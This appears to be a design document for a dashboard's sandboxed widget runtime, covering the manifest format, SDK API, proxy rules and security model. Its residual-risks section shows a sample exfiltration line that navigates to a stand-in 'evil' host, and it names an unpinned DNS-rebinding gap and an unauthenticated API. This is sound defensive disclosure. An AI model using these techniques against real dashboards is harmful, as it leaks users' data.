# Widget runtime

A widget definition is a folder in `widgets/<id>/` (builtins, seeded on startup) or a row in
`widget_defs` (future AI-generated / imported widgets, `builtin=0`).

## manifest.json

```json
{
  "name": "Weather",
  "description": "Shown in the picker",
  "size": { "w": 3, "h": 3 },
  "permissions": { "hosts": ["api.open-meteo.com", "*.example.com", "192.168.1.5:8080"], "secrets": ["API_KEY"] },
  "props": { "city": { "type": "string|number|boolean|select", "label": "City", "default": "Berlin", "options": [] } }
}
```

Host patterns without a port allow only 80/443. `*.x.com` matches subdomains, not `x.com`.

## index.html

An HTML fragment placed in `<body>`. The SDK is available as `window.hosted`:

| API | |
|---|---|
| `await hosted.ready` | resolves (to `hosted`) once props/theme arrive |
| `hosted.props` / `hosted.onProps(fn)` | instance settings (manifest defaults merged) |
| `await hosted.fetch(url, {method, headers, body})` | proxied request → `{ok, status, headers, text(), json(), dataUrl()}` |
| `"{{secret.NAME}}"` | placeholder in url/headers/body, filled in server-side |
| `hosted.hasSecret(name)` | whether a granted secret is set (value never exposed) |
| `hosted.storage.get/set/remove(key)` | per-instance JSON KV (64 KB/value, 100 keys) |
| `hosted.setProps(partial)` | persist settings from inside the widget |

Theme CSS variables (`--text`, `--muted`, `--accent`, `--card`, `--bg`, `--radius`) are set on
`:root`; `.muted` and `.error` classes are predefined. Uncaught errors are shown on the widget.

## Security model

- Frame: `sandbox="allow-scripts"` (opaque origin: no cookies, storage, or parent DOM) and a
  CSP of `default-src 'none'; connect-src 'none'; img-src data: blob:` ... so the widget has no
  direct network access. Images from the network must come through `hosted.fetch` + `dataUrl()`.
- The dashboard identifies callers by `event.source` window, so a widget can't act as another.
- Grants are snapshotted from the manifest when the user adds the instance; the proxy enforces
  `grants ∩ current manifest`, so a redefined widget can never silently gain hosts or secrets.
  `PUT /api/widgets/{id}` cannot change grants or the widget type.
- Proxy: http(s) only, no URL credentials, redirects re-checked per hop (headers dropped
  cross-host), 2 MB / 10 s limits, secret values redacted from responses. A public hostname
  may not resolve to loopback/private/link-local addresses (DNS-rebinding guard); LAN names
  (`.lan`, `.local`, `.home.arpa`, bare names) and IP literals may resolve privately; loopback
  must be granted literally (`localhost`, `127.0.0.1`).

### Known residual risks

- **Self-navigation**: no sandbox flag or CSP directive stops a frame from navigating itself, so
  a malicious widget can leak data it was *legitimately given* (props, granted-host responses,
  its storage) once via `location = "https://evil/?…"`. The dashboard detects the second frame
  load, blanks the frame and flags it — but the request has already been sent. Secrets never
  enter the frame, so they can't leak this way.
- DNS check-then-connect is not pinned (TOCTOU) — a fast-flipping rebind could slip through.
- The dashboard itself has no authentication yet; anyone who can reach it can use the API.
